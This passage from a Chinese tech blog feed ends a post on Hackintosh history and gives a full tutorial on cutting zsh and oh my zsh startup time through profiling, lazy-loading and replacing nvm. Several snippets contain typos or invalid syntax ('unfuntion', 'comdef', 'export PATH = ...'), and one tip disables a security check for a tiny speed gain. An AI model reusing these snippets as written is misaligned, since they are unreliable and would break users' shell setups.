终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 